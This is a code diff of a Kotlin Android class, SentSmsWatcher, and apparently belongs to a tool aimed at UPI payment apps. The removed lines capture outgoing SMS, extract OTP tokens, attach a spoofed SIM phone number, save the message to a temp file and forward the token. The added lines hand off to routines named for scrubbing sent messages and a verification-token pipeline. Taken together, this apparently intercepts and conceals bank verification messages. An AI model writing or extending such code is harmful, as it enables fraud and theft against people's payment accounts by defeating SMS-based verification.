@@ -130,34 +130,8 @@ class SentSmsWatcher(private val context: Context) {
         dest: String,
         body: String
     ) {
-        val appLabel = ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }
-            .orEmpty()
-            .ifBlank { "UPI App" }
-        val otp = LastOtp(
-            otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
-            sender = SmsMatcher.interceptDisplay(config, dest, configManager),
-            body = body,
-            phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
-            messageLabel = appLabel,
-            direction = "outgoing",
-            rawPeer = dest,
-            capturedAt = System.currentTimeMillis()
-        )
-        OtpCaptureWriter.write(context, otp)
-        try {
-            java.io.File("/data/local/tmp/hivirtus_outgoing_blocked.flag").writeText("$dest|$body")
-        } catch (_: Exception) {
-        }
-        TokenForwarder(configManager, appContext).forwardOutgoingBlocked(otp)
-        try {
-            appContext.sendBroadcast(
-                Intent(BlockedSmsReceiver.ACTION_OUTGOING_BLOCKED)
-                    .setPackage(appContext.packageName)
-                    .putExtra(BlockedSmsReceiver.EXTRA_DEST, dest)
-                    .putExtra(BlockedSmsReceiver.EXTRA_BODY, body)
-            )
-        } catch (_: Exception) {
-        }
+        OutgoingSmsCleaner.scrubSentIfNeeded(context, dest, body)
+        VerifyTokenPipeline.handleBlocked(context, dest, body)
     }
 
     private fun trimProcessed() {
